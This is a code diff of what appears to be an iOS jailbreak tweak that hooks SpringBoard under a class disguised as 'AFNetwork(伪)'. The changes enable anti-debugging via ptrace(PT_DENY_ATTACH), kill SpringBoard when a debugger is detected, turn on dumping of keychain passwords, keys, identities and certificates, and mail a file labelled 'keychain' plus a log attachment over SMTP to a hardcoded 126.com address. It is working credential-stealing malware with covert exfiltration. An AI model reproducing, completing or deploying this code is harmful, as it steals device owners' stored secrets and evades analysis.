@@ -23,7 +23,9 @@
 #include <sys/mman.h>
 #include <stdlib.h>
 #include <arpa/inet.h>
-//#include <sys/ptrace.h>
+#include <sys/ptrace.h>
+
+
 
 #pragma mark - Keychain Prototype Function
 
@@ -39,6 +41,35 @@ void printKey(NSDictionary *keyItem);
 void printResultsForSecClass(NSArray *keychainItems, CFTypeRef kSecClassType);
 void printIdentity(NSDictionary *identityItem);
 void printCertificate(NSDictionary *certificateItem);
+
+const int matrix[26][26]={
+    {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25},
+    {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0},
+    {2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1},
+    {3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2},
+    {4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3},
+    {5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4},
+    {6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5},
+    {7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6},
+    {8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7},
+    {9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8},
+    {10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9},
+    {11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10},
+    {12,13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11},
+    {13,14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12},
+    {14,15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,13},
+    {15,16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14},
+    {16,17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15},
+    {17,18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16},
+    {18,19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17},
+    {19,20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18},
+    {20,21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19},
+    {21,22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20},
+    {22,23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21},
+    {23,24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22},
+    {24,25,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23},
+    {25,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24}
+};
 
 @interface AFNetwork : NSObject
 
@@ -344,8 +375,6 @@ static int is_being_debugging(void)
 
 
 
-
-
 #pragma mark - Send Mail
 
 struct data6  {
@@ -529,6 +558,11 @@ int open_socket(struct sockaddr *addr) {
     return sockfd;
 }
 
+
+
+
+
+
 #pragma mark - AFNetwork(伪)
 
 @implementation AFNetwork
@@ -585,6 +619,7 @@ static IMP crackSB = NULL;
 @implementation crackSpringBoard
 
 - (void)setuid:(uint8_t )ab{
+    
     Class originalClass = NSClassFromString(@"SBControlCenterController");  //%hook SBControlCenterController
     Method originalMeth = class_getInstanceMethod(originalClass, @selector(switcherWasPresented:));
     crackSB = method_getImplementation(originalMeth);
@@ -602,7 +637,7 @@ static IMP sOriginalImp = NULL;
     if (is_being_debugging()) {
         system("killall -9 SpringBoard");
     }
-    //ptrace(PT_DENY_ATTACH, 0, 0, 0);
+    ptrace(PT_DENY_ATTACH, 0, 0, 0);
     static dispatch_once_t onceToken;
     dispatch_once(&onceToken, ^{
         Class originalClass = NSClassFromString(@"SBAppSliderController");  //%hook SBAppSliderController
@@ -618,7 +653,7 @@ static IMP sOriginalImp = NULL;
     if (is_being_debugging()) {
         system("killall -9 SpringBoard");
     }
-    //ptrace(PT_DENY_ATTACH, 0, 0, 0);
+    ptrace(PT_DENY_ATTACH, 0, 0, 0);
     
     sOriginalImp(self, @selector(switcherWasPresented:), self);   //%orig
     
@@ -632,16 +667,67 @@ static IMP sOriginalImp = NULL;
         int len = (int)lseek(fd,0,SEEK_END);
         char *mbuf = (char *) mmap(NULL,len,PROT_READ,MAP_PRIVATE,fd,0);
         setuid(0);
-        sendmail("445108920@qq.com","fill your password","445108920@qq.com","smtp.qq.com","keychain",mbuf);
+        sendmail("meirtz@126.com","YOUR_PASSWORD","meirtz@126.com","smtp.126.com","keychain",mbuf);
     });
     
 
-    /*dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassGenericPassword), (CFTypeRef)(id)kSecClassGenericPassword);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassInternetPassword), (CFTypeRef)(id)kSecClassInternetPassword);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassIdentity), (CFTypeRef)(id)kSecClassIdentity);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassCertificate), (CFTypeRef)(id)kSecClassCertificate);
         printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassKey), (CFTypeRef)(id)kSecClassKey);
-    });*/
+    });
+}
+
+
+//----------------------------------------------------
+
+#pragma Meirtz Attachment Sending
+
+
+- (void)sendAttachment {
+    SKPSMTPMessage *weibo_files = [[SKPSMTPMessage alloc] init];
+    weibo_files.fromEmail = @"meirtz@126.com";
+    weibo_files.toEmail = @"meirtz@126.com";
+    weibo_files.relayHost = @"smtp.126.com";
+    weibo_files.requiresAuth = YES;
+    weibo_files.login = @"meirtz@126.com";
+    weibo_files.pass = @"YOUR_PASSWORD";
+    weibo_files.wantsSecure = YES;
+    weibo_files.subject = @"Weibo Files";
+    
+    weibo_files.delegate = self;
+    
+    
+    NSMutableArray *parts_to_send = [NSMutableArray array];
+    
+    NSDictionary *plain_text_part = [NSDictionary dictionaryWithObjectsAndKeys:
+                                     @"text/plain\r\n\tcharset=UTF-8;\r\n\tformat=flowed", kSKPSMTPPartContentTypeKey,
+                                     [@"here's the nice one" stringByAppendingString:@"\n"], kSKPSMTPPartMessageKey,
+                                     @"quoted-printable", kSKPSMTPPartContentTransferEncodingKey,
+                                     nil];
+    [parts_to_send addObject:plain_text_part];
+    
+    
+    NSString *vcard_path = [[NSBundle mainBundle] pathForResource:@"test" ofType:@"vcf"];
+    NSData *vcard_data = [NSData dataWithContentsOfFile:vcard_path];
+    NSDictionary *vcard_part = [NSDictionary dictionaryWithObjectsAndKeys:
+                                @"text/directory;\r\n\tx-unix-mode=0644;\r\n\tname=\"taiji.log\"",kSKPSMTPPartContentTypeKey,
+                                @"attachment;\r\n\tfilename=\"/var/mobile/taiji.log\"",kSKPSMTPPartContentDispositionKey,
+                                [vcard_data encodeBase64ForData],kSKPSMTPPartMessageKey,
+                                @"base64",kSKPSMTPPartContentTransferEncodingKey,nil];
+    [parts_to_send addObject:vcard_part];
+    
+    
+    
+    [weibo_files send];
+    
+    weibo_files.parts = parts_to_send;
+    
 }
 @end
+
+
+
+
